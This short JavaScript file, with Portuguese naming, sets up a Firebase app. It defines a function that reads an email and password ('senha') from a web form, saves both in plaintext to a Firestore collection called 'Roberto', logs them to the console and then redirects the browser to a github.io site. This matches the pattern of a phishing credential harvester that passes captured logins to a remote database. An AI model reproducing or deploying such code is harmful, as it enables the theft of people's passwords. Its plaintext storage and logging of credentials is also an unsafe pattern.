firebase.initializeApp({
    apiKey: "AIzaSyDExzgvyT17ijEfDmpjxXAvBAbKUf_LqKs",
    authDomain: "trilogy-cb06b.firebaseapp.com",
    projectId: "trilogy-cb06b",
    storageBucket: "trilogy-cb06b.appspot.com",
    messagingSenderId: "842501809889",
    appId: "1:842501809889:web:139e0214628a41412df9a0",
    measurementId: "G-28XYWPKP0L"
  });

var db = firebase.firestore();

function adicionarDados(){

    var email = document.getElementById('email').value;
    var senha = document.getElementById('senha').value;
    db.collection("Roberto").add({
        Nome: email,
        Valor: senha,
    })
    console.log(email+" "+senha);

    setTimeout(function(){
    window.location.href = "https://leopoglia.github.io/trilogy/";
    },300);

}


